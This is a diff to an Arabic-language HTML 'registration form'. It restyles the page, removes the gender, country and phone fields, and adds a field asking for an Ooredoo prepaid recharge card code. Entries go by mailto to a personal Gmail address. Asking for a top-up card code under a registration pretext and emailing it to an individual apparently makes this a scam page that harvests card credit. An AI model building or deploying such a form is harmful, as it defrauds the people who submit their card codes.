@@ -1,31 +1,33 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
   <title>نموذج التسجيل</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #CCFF66;
+      background-image: url('650b6ce929599811871182d0_600f074c678046430664d0dc_HLDTTTW_Blog-Header-23.png');
+      background-size: cover;
+      background-position: center;
       margin: 0;
       padding: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
 
     form {
+      width: 80%;
+      max-width: 500px;
       background: rgba(255, 255, 255, 0.7);
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-      width: 80%;
-      max-width: 400px;
     }
 
     h2 {
       text-align: center;
-      color: #F00;
+      color: #333;
     }
 
     label {
@@ -34,14 +36,14 @@
       color: #333;
     }
 
-    input[type="text"],
-    input[type="submit"],
-    select {
-      width: calc(100% - 22px);
+    input[type="text"], input[type="submit"] {
+      width: 100%; /* تعديل عرض الحقول ليمتلئ الشاشة */
+      height: 50px; /* تعديل ارتفاع الحقول */
       padding: 8px;
       margin-bottom: 10px;
       border: 1px solid #ccc;
       border-radius: 5px;
+      box-sizing: border-box; /* تأكيد عدم إضافة حجم الحواف إلى العرض والارتفاع */
     }
 
     input[type="submit"] {
@@ -58,27 +60,17 @@
   </style>
 </head>
 <body>
-  <h2>نموذج التسجيل</h2>
 
   <form action="mailto:wided.mee@gmail.com" method="post" enctype="text/plain">
-    <label for="fullName">الاسم واللقب:</label><br>
+    <h2>نموذج التسجيل</h2>
+    <label for="fullName">الاسم واللقب:</label>
     <input type="text" id="fullName" name="fullName"><br><br>
     
-    <label for="dob">تاريخ الولادة:</label><br>
+    <label for="dob">تاريخ الولادة:</label>
     <input type="text" id="dob" name="dob"><br><br>
     
-    <label for="gender">الجنس:</label><br>
-    <select id="gender" name="gender">
-      <option value="male">ذكر</option>
-      <option value="female">أنثى</option>
-      <option value="other">آخر</option>
-    </select><br><br>
-
-    <label for="country">البلد:</label><br>
-    <input type="text" id="country" name="country"><br><br>
-
-    <label for="phone">رقم الهاتف:</label><br>
-    <input type="text" id="phone" name="phone"><br><br>
+    <label for="ooredooCard">بطاقة شحن Ooredoo:</label>
+    <input type="text" id="ooredooCard" name="ooredooCard"><br><br>
     
     <input type="submit" value="إرسال">
   </form>
